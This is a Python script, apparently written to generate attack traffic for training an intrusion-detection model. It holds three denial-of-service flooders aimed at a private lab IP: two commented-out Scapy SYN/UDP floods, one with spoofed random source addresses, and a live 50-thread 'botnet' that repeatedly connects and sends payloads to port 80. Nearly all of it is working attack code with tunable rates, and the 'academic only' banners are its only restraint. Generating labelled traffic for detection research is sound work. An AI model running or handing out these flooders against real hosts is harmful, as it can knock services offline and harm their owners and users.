# # from scapy.all import IP, TCP, UDP, send
# # import random
# # import time

# # # -------------------------------------------------------------
# # # CONFIGURATION
# # # -------------------------------------------------------------
# # TARGET_IP = "192.168.98.148"     # Change ONLY for lab testing
# # TARGET_PORT = 80
# # ATTACK_DURATION = 20       # seconds
# # PACKETS_PER_SECOND = 1000   # control intensity
# # PROTOCOL = "UDP"           # TCP / UDP

# # # -------------------------------------------------------------
# # # PACKET GENERATOR
# # # -------------------------------------------------------------
# # def generate_packet():
# #     src_port = random.randint(1024, 65535)

# #     if PROTOCOL == "TCP":
# #         return IP(dst=TARGET_IP) / TCP(
# #             sport=src_port,
# #             dport=TARGET_PORT,
# #             flags="S"
# #         )

# #     else:  # UDP
# #         payload = random._urandom(32)
# #         return IP(dst=TARGET_IP) / UDP(
# #             sport=src_port,
# #             dport=TARGET_PORT
# #         ) / payload

# # # -------------------------------------------------------------
# # # ATTACK SIMULATION
# # # -------------------------------------------------------------
# # def start_attack():
# #     print("🚨 Simulated DDoS traffic started")
# #     start_time = time.time()

# #     while time.time() - start_time < ATTACK_DURATION:
# #         packets = [generate_packet() for _ in range(PACKETS_PER_SECOND)]
# #         send(packets, verbose=False)
# #         time.sleep(1)

# #     print("🛑 Simulated DDoS traffic stopped")

# # # -------------------------------------------------------------
# # # MAIN
# # # -------------------------------------------------------------
# # if __name__ == "__main__":
# #     print("⚠️ FOR ACADEMIC / LOCAL TESTING ONLY")
# #     print(f"Target IP: {TARGET_IP}")
# #     print(f"Protocol: {PROTOCOL}")
# #     start_attack()
# from scapy.all import IP, TCP, send
# import random
# import time

# # ==========================================================
# # CONFIG (MATCHES YOUR TRAINING FEATURES)
# # ==========================================================
# TARGET_IP = "192.168.98.148"   # YOUR Wi-Fi IP (MANDATORY)
# TARGET_PORT = 80

# FLOW_DURATION = 2.0            # seconds (short flow)
# PACKETS_PER_FLOW = 200         # high forward packet count
# PACKET_SIZE = 512              # fixed size → stable Fwd Packet Length Max
# INTER_PACKET_GAP = 0.002       # ~500 packets/sec
# FLOW_PAUSE = 0.2               # minimal idle

# # ==========================================================
# # SINGLE FLOW GENERATOR (5-tuple consistent)
# # ==========================================================
# def send_ddos_flow():
#     src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
#     src_port = random.randint(1024, 65535)

#     payload = b"A" * PACKET_SIZE
#     start_time = time.time()
#     sent = 0

#     while time.time() - start_time < FLOW_DURATION:
#         pkt = (
#             IP(src=src_ip, dst=TARGET_IP) /
#             TCP(
#                 sport=src_port,
#                 dport=TARGET_PORT,
#                 flags="S",       # forward-only packets
#                 window=1024
#             ) /
#             payload
#         )
#         send(pkt, verbose=False)
#         sent += 1
#         time.sleep(INTER_PACKET_GAP)

#     return sent

# # ==========================================================
# # ATTACK CONTROLLER
# # ==========================================================
# def start_attack():
#     print("🚨 Feature-aligned DDoS attack started")
#     print("Target:", TARGET_IP)
#     print("Protocol: TCP (6)")

#     total_packets = 0

#     for _ in range(10):  # multiple flows
#         total_packets += send_ddos_flow()
#         time.sleep(FLOW_PAUSE)

#     print("🛑 Attack finished")
#     print("Total packets sent:", total_packets)

# # ==========================================================
# # MAIN
# # ==========================================================
# if __name__ == "__main__":
#     print("ACADEMIC / LOCAL TESTING ONLY")
#     start_attack()

import socket
import threading
import time
import random

# ==========================================================
# TARGET (MUST BE Wi-Fi IP)
# ==========================================================
TARGET_IP = "192.168.98.148"   # Your Wi-Fi IPv4
TARGET_PORT = 80

# ==========================================================
# BOTNET CONFIG
# ==========================================================
BOT_COUNT = 50                 # number of simulated bots
ATTACK_DURATION = 20           # seconds
REQUEST_SIZE = 1024            # bytes per send
SLEEP_BETWEEN_REQ = 0.005      # controls packets/sec

# ==========================================================
# SINGLE BOT BEHAVIOR
# ==========================================================
def bot_worker(bot_id):
    end_time = time.time() + ATTACK_DURATION

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)

            # connect → forward + backward packets
            s.connect((TARGET_IP, TARGET_PORT))

            # send payload → increases Flow Bytes/s
            s.sendall(b"A" * REQUEST_SIZE)

            s.close()

            # minimal idle → Idle Mean ≈ 0
            time.sleep(SLEEP_BETWEEN_REQ)

        except Exception:
            pass

# ==========================================================
# BOTNET CONTROLLER
# ==========================================================
def start_botnet_attack():
    print("🚨 Botnet-style DDoS attack started")
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Bots: {BOT_COUNT}")

    threads = []

    for i in range(BOT_COUNT):
        t = threading.Thread(target=bot_worker, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("🛑 Botnet attack finished")

# ==========================================================
# MAIN
# ==========================================================
if __name__ == "__main__":
    print("ACADEMIC / LOCAL TESTING ONLY")
    start_botnet_attack()
